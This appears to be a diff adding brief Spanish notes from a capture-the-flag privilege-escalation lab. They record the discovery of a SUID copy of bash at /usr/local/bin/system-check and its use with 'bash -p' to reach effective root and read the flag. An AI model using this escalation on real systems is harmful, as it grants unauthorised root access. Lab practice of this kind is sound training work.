@@ -1,0 +1,24 @@
+# ¿puedo correr algo como root?
+(sin sudo)
+
+# binarios SUID
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/su
+/usr/bin/mount
+/usr/bin/umount
+/usr/bin/chfn
+/usr/local/bin/system-check
+
+# el flag solo-root NO es legible directo:
+ls: cannot access '/root/flag.txt': Permission denied
+cat: /root/flag.txt: Permission denied
+
+# system-check es una copia SUID de bash (GTFOBins: bash -p)
+GNU bash, version 5.2.37(1)-release (x86_64-pc-linux-gnu)
+
+# R3: escalo con -p (mantiene euid=root del dueño) y leo el flag
+uid=1000(operador) gid=1000(operador) euid=0(root) groups=1000(operador)
+FLAG{privesc_suid_root}
